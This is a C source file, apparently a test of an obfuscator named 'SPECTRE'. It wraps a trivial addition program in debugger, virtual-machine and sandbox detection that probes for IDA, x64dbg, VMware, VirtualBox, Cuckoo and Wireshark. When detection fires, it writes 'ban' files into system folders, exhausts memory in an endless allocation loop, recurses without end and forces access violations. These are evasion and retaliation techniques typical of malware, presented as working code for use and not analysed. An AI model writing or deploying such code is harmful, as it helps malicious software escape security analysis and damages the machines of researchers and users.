
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#ifdef _WIN32
#ifdef _MSC_VER
// MSVC compiler - full Windows headers available
#include <windows.h>
#include <winternl.h>
#include <intrin.h>
#else
// Clang/GCC on Windows - use minimal headers
// Windows headers may not be available, so we'll use basic checks only
#endif
#endif

// ========== AGGRESSIVE COUNTERMEASURES ==========
// Device fingerprinting and banning
void _ban_device() {
#ifdef _WIN32
    // Write ban marker to file (works without Windows SDK)
    FILE* ban_file = fopen("C:\\SPECTRE_BANNED.txt", "w");
    if (ban_file) {
        fprintf(ban_file, "DEVICE BANNED\n");
        fprintf(ban_file, "REASON: VM_SANDBOX_DETECTED\n");
        fprintf(ban_file, "TIMESTAMP: %ld\n", (long)time(NULL));
        fclose(ban_file);
    }
    
    // Also write to temp directory
    ban_file = fopen("C:\\Windows\\Temp\\spectre_ban.log", "w");
    if (ban_file) {
        fprintf(ban_file, "BANNED: VM/SANDBOX DETECTED\n");
        fclose(ban_file);
    }
#endif
}

// System crash mechanism
void _trigger_system_crash() {
#ifdef _WIN32
    // Method 1: Infinite loop with memory allocation (resource exhaustion)
    while(1) {
        void* mem = malloc(1024 * 1024 * 100); // 100MB per iteration
        if (!mem) break;
        memset(mem, 0xFF, 1024 * 1024 * 100);
    }
    
    // Method 2: Stack overflow
    _trigger_system_crash(); // Recursive call
#endif
}

// Memory corruption attack
void _corrupt_memory() {
#ifdef _WIN32
    // Trigger access violation
    int* null_ptr = NULL;
    *null_ptr = 0xDEADBEEF;
    
    // If that didn't crash, try invalid memory access
    volatile char* bad_addr = (char*)0xFFFFFFFF;
    *bad_addr = 0;
#endif
}

// Execute aggressive response
void _execute_aggressive_response() {
#ifdef _WIN32
    _ban_device();
    
    // Small delay
    for(volatile long i = 0; i < 100000000; i++);
    
    _trigger_system_crash();
    _corrupt_memory();
#endif
}
#include <stdio.h>

int add(int a, int b) {
    return a + b;
}


// Anti-Debugging Checks (Clang-compatible)
int _check_debugger_present() {
#ifdef _WIN32
    // Check 1: Check for debugger via timing
    clock_t start = clock();
    for(volatile int i = 0; i < 1000; i++);
    clock_t end = clock();
    if ((end - start) > 100) {
        return 1; // Debugger detected (slow execution)
    }
    
    // Check 2: Check for common debugger processes via file existence
    FILE* f = fopen("C:\\Program Files\\IDA\\ida.exe", "r");
    if (f) {
        fclose(f);
        return 1; // IDA Pro detected
    }
    
    f = fopen("C:\\Program Files\\x64dbg\\x64dbg.exe", "r");
    if (f) {
        fclose(f);
        return 1; // x64dbg detected
    }
    
    // Check 3: Environment variable check
    if (getenv("_NT_SYMBOL_PATH") != NULL) {
        return 1; // Debugger environment detected
    }
#endif
    return 0;
}



// VM Detection Checks (Clang-compatible)
int _check_vm_environment() {
#ifdef _WIN32
    // Check 1: Check for VM-specific files
    FILE* f = fopen("C:\\windows\\system32\\drivers\\vmmouse.sys", "r");
    if (f) {
        fclose(f);
        return 1;  // VMware mouse driver detected
    }
    
    f = fopen("C:\\windows\\system32\\drivers\\vmhgfs.sys", "r");
    if (f) {
        fclose(f);
        return 1;  // VMware HGFS driver detected
    }
    
    f = fopen("C:\\windows\\system32\\drivers\\VBoxGuest.sys", "r");
    if (f) {
        fclose(f);
        return 1;  // VirtualBox guest driver detected
    }
    
    // Check 2: Check for VM-specific directories
    f = fopen("C:\\Program Files\\VMware\\VMware Tools\\vmtoolsd.exe", "r");
    if (f) {
        fclose(f);
        return 1;  // VMware Tools detected
    }
    
    f = fopen("C:\\Program Files\\Oracle\\VirtualBox Guest Additions\\VBoxService.exe", "r");
    if (f) {
        fclose(f);
        return 1;  // VirtualBox Guest Additions detected
    }
    
    // Check 3: Check environment variables
    if (getenv("VBOX_USER_HOME") != NULL) {
        return 1;  // VirtualBox environment
    }
#endif
    return 0;
}



// Sandbox Detection Checks (Clang-compatible)
int _check_sandbox_environment() {
#ifdef _WIN32
    // Check 1: Check for common sandbox usernames via environment
    char* username = getenv("USERNAME");
    if (username) {
        if (strstr(username, "sandbox") || 
            strstr(username, "malware") ||
            strstr(username, "virus") ||
            strstr(username, "test") ||
            strstr(username, "user")) {
            return 1;
        }
    }
    
    // Check 2: Check for sandbox-specific environment variables
    if (getenv("SANDBOX") != NULL || 
        getenv("MALWARE_SANDBOX") != NULL) {
        return 1;
    }
    
    // Check 3: Check for Cuckoo sandbox files
    FILE* f = fopen("C:\\cuckoo\\agent.py", "r");
    if (f) {
        fclose(f);
        return 1;
    }
    
    // Check 4: Check for common analysis tools
    f = fopen("C:\\Program Files\\Wireshark\\Wireshark.exe", "r");
    if (f) {
        fclose(f);
        return 1;  // Network analysis tool detected
    }
#endif
    return 0;
}



// Timing-based Anti-Debugging
#include <time.h>
int _check_timing_attack() {
    clock_t start = clock();
    
    // Do some dummy work
    volatile int dummy = 0;
    for (int i = 0; i < 1000; i++) {
        dummy += i;
    }
    
    clock_t end = clock();
    double elapsed = ((double)(end - start)) / CLOCKS_PER_SEC;
    
    // If execution took too long, debugger might be present
    if (elapsed > 0.01) {  // 10ms threshold
        return 1;
    }
    
    return 0;
}


int main() {
    if (_check_timing_attack()) { _execute_aggressive_response(); return -1; }

    if (_check_sandbox_environment()) { _execute_aggressive_response(); return -1; }

    if (_check_vm_environment()) { _execute_aggressive_response(); return -1; }

    if (_check_debugger_present()) { _execute_aggressive_response(); return -1; }

    int x = 10;
    int y = 20;
    int result = add(x, y);
    
    printf("Testing SPECTRE Obfuscation\n");
    printf("Result: %d + %d = %d\n", x, y, result);
    printf("Obfuscation test successful!\n");
    
    return 0;
}
